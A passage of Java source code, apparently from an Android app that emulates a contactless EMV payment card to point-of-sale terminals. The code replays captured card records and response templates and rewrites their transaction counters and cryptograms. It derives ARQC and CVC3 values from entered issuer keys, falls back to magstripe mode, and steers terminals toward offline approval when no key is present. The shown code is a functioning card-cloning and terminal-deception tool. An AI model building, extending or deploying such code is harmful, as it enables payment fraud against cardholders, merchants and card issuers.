        // MSD: a profile that declares its own MSD AIP wins outright. Under
        // Visa the MSD bit is byte 2 0x80 and has to be SET, the opposite of
        // Mastercard, so a single mask cannot serve both.
        if (msd) {
            byte[] m = profileMsdAip();
            used = (m != null)
                    ? m
                    : new byte[]{(byte) (used[0] & AIP_MSD_KEEP_1),
                                 (byte) (used[1] & AIP_MSD_KEEP_2)};
        }

        txnAip = used;

        byte[] pdolData = (txnPdol != null) ? txnPdol : pdolDataOf(apdu);
        txnPdol = pdolData;

        byte cid = gpoCidFor();
        gpoCid = String.format("%02X", cid & 0xFF);
        lastCid = gpoCid;

        String atc = txnAtc();
        byte[] ac = computeAc(atc, pdolData);
        cryptogramSent = !STRIP_AC;

        String iad = iadHex();

        byte[] a = afl();
        tap("-- gpo msd=" + msd + " aip=" + bytesToHex(used) + " afl=" + bytesToHex(a)
                + " cid=" + gpoCid + (STRIP_AC ? " (not sent)" : "")
                + " atc=" + atc + " arqc=" + bytesToHex(ac));

        // Format 1: flat, AIP then AFL, no inner tags. MSD has no cryptogram
        // here - the track comes from the record, the CSC from the CCC.
        if (msd) {
            byte[] payload = cat(used, a);
            tap("-- msd: gpo format 1 aip=" + bytesToHex(used) + " afl=" + bytesToHex(a)
                    + " payload=" + payload.length + "B " + bytesToHex(payload));
            postSanity();
            return cat(tlv(0x80, payload), SW_OK);
        }

        byte[] body = cat(
                tlv(0x82, used),
                tlv(0x94, a));
        if (!iad.isEmpty()) body = cat(body, tlv(0x9F10, hex(iad)));

        if (!STRIP_AC) {
            body = cat(body,
                    tlv(0x9F26, ac),
                    tlv(0x9F27, new byte[]{cid}),
                    tlv(0x9F36, hex(atc)));
        }

        commitAtc();
        watchForStall();
        return cat(tlv(0x77, body), SW_OK);
    }

    /**
     * Run the MSD self-check AFTER the GPO response, on the main looper.
     *
     * It used to run inline in the PPSE branch, before the directory was
     * answered - and it calls afl(), which calls keys(), which is getAll() and
     * therefore a full decrypt of the store. The first thing a terminal got back
     * from a cold tap was a directory delayed by a whole-file decrypt.
     *
     * Posting it moves all of that off the response path. The epoch check makes
     * it drop out if the tap ended first, because resetTransaction() clears the
     * queued runnable and bumps the epoch - the same two halves the stall
     * watcher relies on.
     */
    private void postSanity() {
        final int epoch = txnEpoch;
        try {
            ui.post(new Runnable() {
                @Override
                public void run() {
                    if (epoch != txnEpoch) return;
                    try {
                        msdSanity();
                    } catch (Throwable t) {
                        tap("!! msd sanity failed: " + t);
                    }
                }
            });
        } catch (Throwable ignored) { }
    }

    /**
     * Watch for a terminal that takes the GPO and then goes quiet.
     *
     * That is the single most common failure and it leaves no line of its own -
     * the log just stops after the GPO. The watcher names it 1.5s later.
     *
     * THREE separate hazards, all handled here:
     *
     * 1. It runs on the main looper but reads counters the binder thread writes.
     *    So the counters are SNAPSHOTTED into finals now, at GPO time, and the
     *    runnable never touches the live fields.
     * 2. A fast tap can end before 1.5s. resetTransaction() then zeroes the
     *    counters, and without a guard the watcher reports "read no records" for
     *    a tap that finished cleanly. The epoch makes it drop out instead.
     * 3. A new tap can start inside the window. Same epoch check, because
     *    resetTransaction() bumps it at the start of a tap too - so the watcher
     *    never reports tap B's counters as tap A's.
     *
     * Queued copies are also cleared outright in resetTransaction(), so a tap
     * that ends early does not leave one sitting in the looper.
     */
    private void watchForStall() {
        final int epoch = txnEpoch;
        final int gpos = nGpos, recs = nRecs, gens = nGens;
        final boolean stripped = STRIP_AC;

        try {
            ui.postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (epoch != txnEpoch) {
                        tap("-- stall watch: tap " + epoch + " is over (now "
                                + txnEpoch + ") - ignored");
                        return;
                    }
                    if (gpos > 0 && recs == 0 && gens == 0) {
                        tap("!! verdict: TAP: terminal took the GPO and read NO"
                                + " records - "
                                + (stripped
                                    ? "no AC in the GPO, so it judged the AIP and AFL"
                                    : "it judged the AIP, AFL and CID")
                                + " and quit");
                    }
                }
            }, 1500L);
        } catch (Throwable ignored) { }
    }

    /**
     * The profile's MSD AIP as bytes, or null when it has none.
     *
     * Validated rather than trusted: it comes from a profile constant that is
     * fed to Hex.hex(), and a one-nibble slip there would be a 6F00 on the GPO
     * of exactly the cards that use the override.
     */
    private byte[] profileMsdAip() {
        String m = activeProfile().msdAip();
        if (m == null) return null;
        m = m.replaceAll("[^0-9A-Fa-f]", "");
        if (m.length() < 4 || (m.length() & 1) != 0) {
            tap("!! profile msd aip \"" + m + "\" unusable - using the mask");
            return null;
        }
        try {
            return hex(m);
        } catch (Throwable t) {
            return null;
        }
    }

    /**
     * Force the AIP of a scripted GPO to the MSD shape.
     *
     * The script path returns before gpo() runs, so the mask inside gpo() never
     * applied while a script was armed. Same rule, applied to the served bytes.
     */
    private byte[] msdAip(byte[] tpl) {
        byte[] aip = capturedAip(tpl);
        if (aip == null || aip.length < 2) return tpl;
        byte[] m = profileMsdAip();
        byte[] set = (m != null)
                ? m
                : new byte[]{(byte) (aip[0] & AIP_MSD_KEEP_1),
                             (byte) (aip[1] & AIP_MSD_KEEP_2)};
        return setAip(tpl, set);
    }

    /** Overwrite the AIP in either framing, in place. */
    private static byte[] setAip(byte[] tpl, byte[] aip) {
        int[] pos = new int[1];
        int outer = readTag(tpl, pos);
        int len = readLen(tpl, pos);

        if (outer == 0x80) {
            if (pos[0] + 2 <= tpl.length) {
                tpl[pos[0]] = aip[0];
                tpl[pos[0] + 1] = aip[1];
            }
            return tpl;
        }

        int end = Math.min(tpl.length, pos[0] + len);
        int i = pos[0];
        while (i < end) {
            int[] q = new int[]{i};
            int t = readTag(tpl, q);
            int l = readLen(tpl, q);
            if (q[0] + l > tpl.length) break;
            if (t == 0x82 && l >= 2) {
                tpl[q[0]] = aip[0];
                tpl[q[0] + 1] = aip[1];
                return tpl;
            }
            i = q[0] + l;
        }
        return tpl;
    }

    /**
     * Name what MSD needs that is not set, at tap time.
     *
     * Every MSD failure is silent, so saying it up front is the only cheap
     * signal. The track sits under 57 on the Visa family and under 9F6B on
     * Mastercard - either tag means the DD was carved out, so both are
     * accepted and the identity check runs on whichever is found.
     *
     * A 9F69 descriptor must also name the UN and carry the three bitmaps,
     * or the terminal has no way to place the CSC in the track.
     */
    private void msdSanity() {
        byte[] rec = msdRecord();
        if (rec == null) {
            tap("!! msd: no skeleton set - no track to MAC");
            return;
        }

        byte[] track = findTag(rec, 0x57);
        if (track == null) track = findTag(rec, 0x9F6B);

        if (track == null) {
            tap("!! msd: skeleton has no 57 or 9F6B - no track to MAC");
        } else if (Arrays.equals(track, track2())) {
            tap("-- msd: track is byte-identical to the field - DD not carved out");
        }

        byte[] udol = findTag(rec, TAG_UDOL);
        if (udol != null) {
            tap("-- msd: 9F69 present - descriptor drives the UN offset");
            if (findTag(rec, TAG_UN_MSD) == null) {
                tap("!! msd: descriptor has no 9F6A - no UN to MAC");
            }
            if (findTag(rec, 0x9F65) == null) tap("!! msd: no 9F65 PAN bitmap");
            if (findTag(rec, 0x9F66) == null) tap("!! msd: no 9F66 DD bitmap - CSC position undefined");
            if (findTag(rec, 0x9F67) == null) tap("!! msd: no 9F67 nUN bitmap");
        } else {
            tap("-- msd: no 9F69 - Visa-family shape, CCC field is the UN only");
        }

        byte[] a = afl();
        if (a.length == 0) {
            tap("!! msd: afl is EMPTY - nothing tells the terminal where the skeleton is");
        } else if (a.length % 4 != 0) {
            tap("!! msd: afl is " + a.length + "B - must be a multiple of 4");
        }

        if (p("ivcvc3", "").trim().isEmpty()) tap("!! msd: IVCVC3 not set - CSC will be 0000");
        if (kdCvc3() == null) tap("!! msd: IMKCVC3 not set - CSC will be 0000");
        tap("-- msd: skeleton " + rec.length + "B, sanity checked");
    }

    private static byte[] forceCid(byte[] tpl, byte cid) {
        int[] pos = new int[1];
        int outer = readTag(tpl, pos);
        int olen  = readLen(tpl, pos);
        int end   = Math.min(tpl.length, pos[0] + olen);

        int i = pos[0];
        while (i < end) {
            int[] q = new int[]{i};
            int t = readTag(tpl, q);
            int l = readLen(tpl, q);
            if (q[0] + l > tpl.length) break;
            if (t == 0x9F27 && l >= 1) {
                tpl[q[0]] = cid;
                return tpl;
            }
            i = q[0] + l;
        }

        byte[] content = Arrays.copyOfRange(tpl, pos[0], Math.min(tpl.length, pos[0] + olen));
        return tlv(outer, cat(content, tlv(0x9F27, new byte[]{cid})));
    }

    /**
     * Overwrite the ATC in a replayed GPO template, in place.
     *
     * The counterpart of forceCid, and only ever called when findTag() has
     * already found a 9F36 - so the append branch is a safety net for a
     * malformed capture, not the normal path.
     */
    private static byte[] forceAtc(byte[] tpl, byte[] atc) {
        int[] pos = new int[1];
        int outer = readTag(tpl, pos);
        int olen  = readLen(tpl, pos);
        int end   = Math.min(tpl.length, pos[0] + olen);

        int i = pos[0];
        while (i < end) {
            int[] q = new int[]{i};
            int t = readTag(tpl, q);
            int l = readLen(tpl, q);
            if (q[0] + l > tpl.length) break;
            if (t == 0x9F36 && l >= 2) {
                tpl[q[0]] = atc[0];
                tpl[q[0] + 1] = atc[1];
                return tpl;
            }
            i = q[0] + l;
        }

        byte[] content = Arrays.copyOfRange(tpl, pos[0], Math.min(tpl.length, pos[0] + olen));
        return tlv(outer, cat(content, tlv(0x9F36, atc)));
    }

    /**
     * Overwrite an existing 9F26 with a freshly computed AC.
     *
     * Only ever called when the tag was already found, so the append branch is
     * a net for a malformed script response. Returns the template, or null if
     * the AC is not eight bytes - a short copy into the tag would leave half a
     * cryptogram behind.
     */
    private static byte[] forceAc(byte[] tpl, byte[] ac) {
        if (ac == null || ac.length < 8) return null;

        int[] pos = new int[1];
        int outer = readTag(tpl, pos);
        int olen  = readLen(tpl, pos);
        int end   = Math.min(tpl.length, pos[0] + olen);

        int i = pos[0];
        while (i < end) {
            int[] q = new int[]{i};
            int t = readTag(tpl, q);
            int l = readLen(tpl, q);
            if (q[0] + l > tpl.length) break;
            if (t == 0x9F26 && l >= 8) {
                System.arraycopy(ac, 0, tpl, q[0], 8);
                return tpl;
            }
            i = q[0] + l;
        }

        byte[] content = Arrays.copyOfRange(tpl, pos[0], Math.min(tpl.length, pos[0] + olen));
        return tlv(outer, cat(content, tlv(0x9F26, ac)));
    }

    /**
     * Wrapper only. Emv holds the canonical implementation, and that is the one
     * under test - the copy that lived here still walked a format 1 payload as
     * TLV and re-encoded the AFL.
     */
    private static byte[] stripAcTags(byte[] tpl) {
        return Emv.stripAcTags(tpl);
    }

    private static byte[] findTag(byte[] tpl, int want) {
        if (tpl == null || tpl.length < 4) return null;
        int[] pos = new int[1];
        int outer = readTag(tpl, pos);
        if (outer == 0x80) return null;
        int olen = readLen(tpl, pos);
        int end  = Math.min(tpl.length, pos[0] + olen);

        int i = pos[0];
        while (i < end) {
            int[] q = new int[]{i};
            int t = readTag(tpl, q);
            int l = readLen(tpl, q);
            if (q[0] + l > tpl.length) break;
            if (t == want) return Arrays.copyOfRange(tpl, q[0], q[0] + l);
            i = q[0] + l;
        }
        return null;
    }

    private byte[] capturedAip(byte[] raw) {
        if (raw == null || raw.length < 4) return null;
        int[] pos = new int[1];
        int outer = readTag(raw, pos);
        if (outer == 0x80) {
            int l = readLen(raw, pos);
            if (l >= 2 && pos[0] + 2 <= raw.length) {
                return Arrays.copyOfRange(raw, pos[0], pos[0] + 2);
            }
            return null;
        }
        int len = readLen(raw, pos);
        int end = Math.min(raw.length, pos[0] + len);
        int i = pos[0];
        while (i < end) {
            int[] q = new int[]{i};
            int t = readTag(raw, q);
            int l = readLen(raw, q);
            if (q[0] + l > raw.length) break;
            if (t == 0x82 && l >= 2) return Arrays.copyOfRange(raw, q[0], q[0] + 2);
            i = q[0] + l;
        }
        return null;
    }

    private byte[] readRecord(int p1, int p2) {
        int sfi = (p2 & 0xFF) >> 3;
        int rec = p1 & 0xFF;

        if (isMsd()) {
            byte[] msd = msdRecord();
            if (msd != null) {
                int[] loc = msdLocation();
                if (loc[0] == sfi && loc[1] == rec) {
                    tap("-- rec sfi=" + sfi + " rec=" + rec + " (msd skeleton, verbatim "
                            + msd.length + "B)");
                    return cat(msd, SW_OK);
                }
                tap("-- rec sfi=" + sfi + " rec=" + rec + " (msd skeleton is sfi="
                        + loc[0] + " rec=" + loc[1] + ")");
                return SW_NO_RECORD;
            }
            tap("-- rec sfi=" + sfi + " rec=" + rec + " (msd but no skeleton set)");
        }

        byte[] captured = rawRec(sfi, rec);
        if (captured != null) {
            tap("-- rec sfi=" + sfi + " rec=" + rec + " (captured)");
            return cat(captured, SW_OK);
        }

        if (sfi == 1) {
            tap("-- rec sfi=1 rec=" + rec + " (synthetic)");
            return cat(syntheticRecord(), SW_OK);
        }

        tap("-- rec miss sfi=" + sfi + " rec=" + rec);
        return SW_NO_RECORD;
    }

    /**
     * Byte offset of 9F6A inside the CCC data field.
     *
     * Visa-family MSD defines no UDOL, so the field is the UN alone and the
     * offset is 0. Only a manually typed 9F69 changes that; a Mastercard
     * skeleton can still carry one.
     *
     * Takes the already-parsed record so ccc() can hand the same bytes to all
     * three helpers instead of parsing the skeleton three times.
     */
    private int unOffset(byte[] rec) {
        if (rec == null) return 0;

        byte[] udol = findTag(rec, TAG_UDOL);
        if (udol == null) return 0;

        int off = 0, i = 0;
        while (i < udol.length) {
            int[] q = new int[]{i};
            int t = readTag(udol, q);
            int l = readLen(udol, q);
            if (q[0] + l > udol.length) break;
            if (t == TAG_UN_MSD) return off;
            off += l;
            i = q[0] + l;
        }
        tap("-- udol present but has no 9F6A - assuming offset 0");
        return 0;
    }

    /** UN length from the 9F69 descriptor, or 4 when there is none. */
    private int unLen(byte[] rec) {
        if (rec == null) return 4;
        byte[] udol = findTag(rec, TAG_UDOL);
        if (udol == null) return 4;
        int i = 0;
        while (i < udol.length) {
            int[] q = new int[]{i};
            int t = readTag(udol, q);
            int l = readLen(udol, q);
            if (q[0] + l > udol.length) break;
            if (t == TAG_UN_MSD) return l;
            i = q[0] + l;
        }
        tap("-- udol present but no 9F6A - assuming UN 4");
        return 4;
    }

    /** Total data length the descriptor asks for, or 4 with no descriptor. */
    private int udolLen(byte[] rec) {
        if (rec == null) return 4;
        byte[] udol = findTag(rec, TAG_UDOL);
        if (udol == null) return 4;
        int n = 0, i = 0;
        while (i < udol.length) {
            int[] q = new int[]{i};
            int t = readTag(udol, q);
            int l = readLen(udol, q);
            if (q[0] + l > udol.length) break;
            n += l;
            i = q[0] + l;
        }
        return n;
    }

    private boolean hasTrack1(byte[] rec) {
        return rec != null && findTag(rec, 0x56) != null;
    }

    /**
     * COMPUTE CRYPTOGRAPHIC CHECKSUM - the MSD cryptogram, CSC.
     *
     * One ATC per tap: gpo() already climbed it, so that value is reused and
     * only a second checksum in the same tap takes a new one.
     *
     * Block is IVCVC3 || UN || ATC, assembled to exactly 8 bytes, 3DES under
     * KDCVC3, LOW two bytes out. The ATC is BINARY - BCD is the trap. No
     * session key and no per-transaction derivation.
     *
     * The data field length is exact, not padded: a strict verifier rejects a
     * short field rather than guessing, so this refuses instead of zero-filling.
     *
     * The UN width comes from the descriptor, not from a literal 4. A skeleton
     * that names a shorter UN would otherwise be sliced at the wrong width and
     * still sum to 8 - wrong input, valid length, no error anywhere.
     *
     * The skeleton is parsed ONCE into rec and handed to the three helpers; it
     * used to be re-read and re-hex-parsed three times on the response path.
     */
    private byte[] ccc(byte[] apdu) {
        if (!gpoOk && recsSinceSelect == 0) {
            tap("!! ccc: no record read this tap - a strict verifier refuses the checksum");
            return SW_CONDITIONS;
        }

        int lc = lcOf(apdu);
        int off = dataOff(apdu);
        byte[] d = (lc > 0 && apdu.length >= off + lc)
                ? Arrays.copyOfRange(apdu, off, off + lc)
                : new byte[0];

        byte[] rec = msdRecord();

        int need = udolLen(rec);
        if (d.length != need) {
            tap("!! ccc: field is " + d.length + "B, descriptor asks " + need
                    + " - refusing, not padding");
            return SW_MALFORMED;
        }

        int uo = unOffset(rec);
        int unWidth = unLen(rec);
        if (uo + unWidth > d.length) {
            tap("!! ccc: 9F6A offset " + uo + " len " + unWidth
                    + " past the " + d.length + "B field");
            return SW_MALFORMED;
        }
        byte[] un = Arrays.copyOfRange(d, uo, uo + unWidth);

        String atc;
        if (atcUsedByCcc) {
            atc = nextAtc();
        } else {
            atc = txnAtc();
            atcUsedByCcc = true;
        }
        byte[] atcB = EmvCrypto.atcField(Integer.parseInt(atc, 16));

        if ((atcB[0] & 0xFF) == 0xFF && (atcB[1] & 0xFF) == 0xFF) {
            tap("!! ccc: ATC exhausted at " + atc);
            return SW_CONDITIONS;
        }

        byte[] iv = hex(p("ivcvc3", "").replaceAll("[^0-9A-Fa-f]", ""));
        byte[] kd = kdCvc3();

        byte[] body;
        if (iv.length != 2 || kd == null) {
            tap("!! ccc: " + (iv.length != 2
                        ? "IVCVC3 not set (needs 4 hex)"
                        : "IMKCVC3 not set (needs 32 or 48 hex)")
                    + " - CSC will be 0000");
            body = tlv(TAG_CVC3_T2, new byte[2]);
        } else {
            byte[] cvc3 = null;
            byte[] cvc3T1 = null;
            try {
                // Assembled to exactly 8, so NoPadding is correct. The block is
                // enciphered raw - it must NOT go through mac(), which would
                // append a full 0x80 pad block and MAC 16 bytes instead of 8.
                byte[] block = Emv.cccBlock(iv, un, atcB);
                if (block.length != 8) {
                    tap("!! ccc: block is " + block.length + "B (iv=" + iv.length
                            + " un=" + un.length + " atc=" + atcB.length + "), must be 8");
                    return SW_MALFORMED;
                } else {
                    byte[] e = EmvCrypto.des3(kd, block);
                    cvc3 = Arrays.copyOfRange(e, e.length - 2, e.length);
                    tap("-- ccc atc=" + atc + " un=" + bytesToHex(un)
                            + " iv=" + bytesToHex(iv) + " kd=" + bytesToHex(kd)
                            + " cvc3=" + bytesToHex(cvc3));

                    byte[] ivT1 = hex(p("ivcvc3_t1", "").replaceAll("[^0-9A-Fa-f]", ""));
                    if (hasTrack1(rec) && ivT1.length == 2) {
                        byte[] e1 = EmvCrypto.des3(kd, Emv.cccBlock(ivT1, un, atcB));
                        cvc3T1 = Arrays.copyOfRange(e1, e1.length - 2, e1.length);
                    }
                }
            } catch (Exception ex) {
                tap("!! ccc failed: " + ex);
            }
            body = tlv(TAG_CVC3_T2, cvc3 == null ? new byte[2] : cvc3);
            if (cvc3T1 != null) body = cat(body, tlv(TAG_CVC3_T1, cvc3T1));
        }

        body = cat(body, tlv(0x9F36, atcB));
        commitAtc();
        return cat(tlv(0x77, body), SW_OK);
    }

    /**
     * GENERATE AC. Unreachable in MSD - that flow is a single CCC exchange -
     * but kept for the EMV path.
     *
     * The CID must not be "higher" than requested: AAC for AAC, ARQC for ARQC,
     * TC for anything else. The response carries 9F10, 9F26, 9F27 and 9F36 and
     * nothing else - 9F34 is a terminal tag. No 9F4B: the AIP has no CDA bit.
     *
     * THE LADDER IS NOT HERE. It lives in Emv.decideCid, as a pure function,
     * because this method needs prefs and a Handler and so cannot be tested
     * without an emulator. Read that method for the order and the two
     * invariants; all this does is gather its inputs and act on the answer.
     *
     * haveKey() is the input worth naming. Without a key computeAc emits eight
     * zero bytes, so an ARQC is unsatisfiable - decideCid refuses to answer one
     * and falls through to TC instead, which is why a keyless card can still
     * approve offline and can never hand the issuer a cryptogram it will reject.
     *
     * That guard only applies when the GPO carried no AC. decideCid's first
     * branch is acInGpo, which answers ARQC for a requested ARQC without
     * consulting haveKey() - which is why the keyless downgrade for the GPO CID
     * lives in gpoCidFor() and not here.
     */
    private byte[] genac(byte[] apdu) {
        int p1 = apdu[2] & 0xFF;
        int requested = p1 & 0xC0;

        String forced = p("cid", "").replaceAll("[^0-9A-Fa-f]", "");
        boolean hasForce = forced.length() == 2;
        byte forcedCid = hasForce ? (byte) Integer.parseInt(forced, 16) : 0;

        byte cid = Emv.decideCid(
                cryptogramSent,
                requested,
                haveKey(),
                hasForce,
                forcedCid,
                ALWAYS_ONLINE_FOR_RECEIPT,
                FORCE_ONLINE_ARQC,
                forceOfflineTc());

        lastCid = String.format("%02X", cid);
        String atc = txnAtc();

        byte[] cdol = dataOf(apdu);
        byte[] ac = computeAc(atc, cdol);
        cryptogramSent = true;

        String iad = iadHex();

        tap("-- genac requested=" + String.format("%02X", requested)
                + " cid=" + lastCid
                + (hasForce ? " (forced from the CID box"
                        + (forcedCid != cid ? ", downgraded" : "") + ")" : "")
                + " forcetc=" + forceOfflineTc()
                + " atc=" + atc + " arqc=" + bytesToHex(ac));

        // No IAD means no tag at all. A zero-length 9F10 is legal BER but the
        // issuer has no CVR or key index to parse, and a kernel that length-
        // checks can reject outright. Amex is the case that reaches this.
        byte[] body = new byte[0];
        if (!iad.isEmpty()) body = cat(body, tlv(0x9F10, hex(iad)));
        body = cat(body,
                tlv(0x9F26, ac),
                tlv(0x9F27, new byte[]{cid}),
                tlv(0x9F36, hex(atc)));

        tap("-- genac body=" + body.length + "B iad=" + hex(iad).length
                + "B arqc=" + ac.length + "B");

        // The cryptogram is in this response, so the counter is spent here. This
        // is the EMV exit - ccc() is only reached in MSD, where the AC comes back
        // as a CVC3 in a 770A body instead.
        commitAtc();
        return cat(tlv(0x77, body), SW_OK);
    }

    /**
     * Cryptogram version from the IAD in force, or -1 when there is none.
     *
     * M/Chip IAD: byte 1 is the DKI, byte 2 is the CVN. 16/17 are SKD, 20/21
     * are CSK. CCD IAD starts 0F and the version is the low nibble.
     */
    private int cvn() {
        String h = iadHex().replaceAll("[^0-9A-Fa-f]", "");
        if (h.length() < 4) return -1;
        try {
            int b1 = Integer.parseInt(h.substring(0, 2), 16);
            int b2 = Integer.parseInt(h.substring(2, 4), 16);
            if (b1 == 0x0F) return b2 & 0x0F;
            return b2;
        } catch (NumberFormatException e) {
            return -1;
        }
    }

    /** 9F37 is the last element of CDOL1, so the UN is the trailing four bytes. */
    private static byte[] unOf(byte[] cdol) {
        if (cdol.length < 4) return new byte[4];
        return Arrays.copyOfRange(cdol, cdol.length - 4, cdol.length);
    }

    /**
     * ARQC over cdol || AIP || ATC || IAD.
     *
     * The IAD carries the CVN, so it belongs in the input by construction. The
     * session key scheme follows the CVN: 16/17 are SKD and take the UN, 20/21
     * are CSK and do not.
     */
    private byte[] computeAc(String atc, byte[] cdol) {
        if (!haveKey()) {
            tap("!! no valid IMK-AC set - ARQC will be all zeros");
            return new byte[8];
        }
        String mk = p("mkac", "").replaceAll("[^0-9A-Fa-f]", "");

        int variant = 0;
        try {
            String kv = p("keyvar", "0").replaceAll("[^0-9A-Fa-f]", "");
            if (!kv.isEmpty()) {
                variant = kv.matches("[0-9]+")
                        ? Integer.parseInt(kv)
                        : Integer.parseInt(kv, 16);
            }
        } catch (Exception ignored) { }
        variant &= 0x03;

        int cvn = cvn();
        boolean csk = (cvn == 20 || cvn == 21);

        try {
            byte[] iad = hex(iadHex());
            byte[] macIn = ((variant & 2) != 0)
                    ? cat(aipForMac(), hex(atc), iad, cdol)
                    : cat(cdol, aipForMac(), hex(atc), iad);

            byte[] un = unOf(cdol);

            byte[] sk = csk
                    ? EmvCrypto.sessionKeyAc(mk, pan(), psn(), atc, variant & 1)
                    : EmvCrypto.sessionKeySkd(mk, pan(), psn(), atc, un, variant & 1);

            tap("-- key cvn=" + (cvn < 0 ? "?" : String.valueOf(cvn))
                    + (csk ? " CSK" : " SKD") + " variant=" + variant
                    + " sk=" + bytesToHex(sk));
            tap("-- macIn " + bytesToHex(macIn));

            return EmvCrypto.mac(sk, macIn);
        } catch (Throwable e) {
            tap("!! ARQC failed: " + e);
            return new byte[8];
        }
    }

    /**
     * GET DATA.
     *
     * 9F13 is the last-online-ATC register, two bytes. 0000 means "never been
     * online", which is the correct state for a fresh card.
     *
     * 9F17 is deliberately ABSENT. The CVM list is 1F03 / 1E03 - no CVM below
     * the limit, signature above - so nothing here ever consumes an offline
     * PIN and there is no counter to report. 00 is the one value that means
     * "zero tries left", a different claim from "no PIN capability", so the tag
     * falls through to 6A88 instead.
     */
    private byte[] getData(byte[] apdu) {
        int tag = ((apdu[2] & 0xFF) << 8) | (apdu[3] & 0xFF);

        if (tag == 0x9F36)      return cat(tlv(0x9F36, hex(txnAtc())), SW_OK);
        else if (tag == 0x9F13) return cat(tlv(0x9F13, hex("0000")), SW_OK);
        else if (tag == 0x9F4D) return cat(tlv(0x9F4D, hex("0B0A")), SW_OK);
        else if (tag == 0x9F4F) return cat(tlv(0x9F4F, hex("9F4D020B0A")), SW_OK);
        return SW_NOT_FOUND;
    }

    private String baseVerdict() {
        if (sawError)     return "TAP: an APDU threw - read the !! line, not the AID list";
        if (tapLog.length() == 0) return "TAP: nothing recorded";

        if (!sawPpse)     return "TAP: terminal never asked for the directory - it never read the phone";
        if (nSelects <= 1) return "TAP: terminal read the directory and quit after one SELECT"
                + " - field drop, or it was not ready";
        if (nGpos == 0)   return "TAP: terminal picked an app then stopped - it rejected the FCI";

        if (isMsd()) {
            if (nGens > 0)  return "TAP: MSD mode but the terminal sent GENERATE AC - MSD is not on";
            if (nCccs == 0) return "TAP: MSD - terminal took " + nRecs
                    + " record(s) and never sent the CCC, so it judged the track without a CSC";
            if (nRecs == 0) return "TAP: MSD - terminal sent the CCC without reading the track";
            return "TAP: MSD - terminal read " + nRecs + " record(s) and sent the CCC "
                    + nCccs + "x; CSC was "
                    + (kdCvc3() == null ? "NOT computable - key missing" : "computed");
        }

        if (nRecs == 0) {
            return "TAP: terminal took the GPO response and read NO records - "
                    + (STRIP_AC
                        ? "no AC in the GPO, so it judged the AIP and AFL"
                        : gpoCid.isEmpty()
                            ? "check the logged AFL"
                            : "it judged the AIP, AFL and CID " + gpoCid);
        }

        if (nGens == 0 && !gpoCid.isEmpty()) {
            return "TAP: terminal read " + nRecs + " record(s) and never asked for a cryptogram"
                    + " | GPO cid " + gpoCid
                    + ("40".equals(gpoCid)
                        ? " (TC - offline approve, this is the good path)"
                        : "");
        }

        if (nGens == 0)   return "TAP: terminal read " + nRecs + " records then quit before the cryptogram";
        if (nGens >= 2)   return "TAP: terminal WENT ONLINE - the issuer judged our ARQC";
        if ("40".equals(lastCid)) return "TAP: we answered TC - terminal should have APPROVED offline";
        if ("80".equals(lastCid)) return "TAP: we answered ARQC - terminal must go online";
        if ("00".equals(lastCid)) return "TAP: we answered AAC - terminal treated it as an offline decline";
        return "TAP: terminal asked for a cryptogram and we did not answer TC";
    }

    private String verdict() {
        String v = baseVerdict();
        int armed = scriptLines();
        if (armed == 0) return v;
        if (!useScript()) return v + " | script armed " + armed + " line(s) but OFF";
        if (scriptHits > 0) return v + " | script hit " + scriptHits + "x";
        return v + " | script armed " + armed + " line(s) but never matched";
    }

    /**
     * The tap is over.
     *
     * THE TAIL IS WRAPPED. Everything after resetTransaction() - the verdict
     * line, the log flush and the pref write - used to run bare, so a throw in
     * any of it killed the process at exactly the moment the phone is pulled
     * away, which reads to the user as "the app closed". Nothing here is worth
     * a crash: the tap has already happened.
     *
     * The slot prefix is read BEFORE resetTransaction(), because reset clears it
     * and the flush below still needs to name the file the lines belong to.
     *
     * tapOpen goes false here, and only here, so the next APDU of THIS tap does
     * not reset what this one built.
     */
    @Override
    public void onDeactivated(int reason) {
        final String t = logText();
        final String slot = sel();
        tapOpen = false;

        String v;
        try {
            v = verdict();
        } catch (Throwable e) {
            v = "TAP: verdict failed - " + e;
        }

        try {
            if (!t.isEmpty()) {
                try {
                    TapLog.append(this, slot, "!! verdict: " + v);
                } catch (Throwable ignored) { }
            }
        } catch (Throwable ignored) { }

        try {
            resetTransaction();
        } catch (Throwable ignored) { }

        try {
            TapLog.flush(this);

            if (!t.isEmpty()) {
                // No clipboard write here any more: it fired on every tap and
                // pushed a full log, PAN included, into whatever app you pasted
                // into next. CaptureActivity's copy button is the explicit route.
                prefs().edit()
                        .putString("taplog", t)
                        .putString("lastverdict", v)
                        .putLong("lastverdict_at", System.currentTimeMillis())
                        .apply();
                popup(v);
            }
        } catch (Throwable e) {
            Log.w(TAG, "deactivate tail failed", e);
        }

        Log.d(TAG, "onDeactivated reason=" + reason + " | " + v);
    }
}
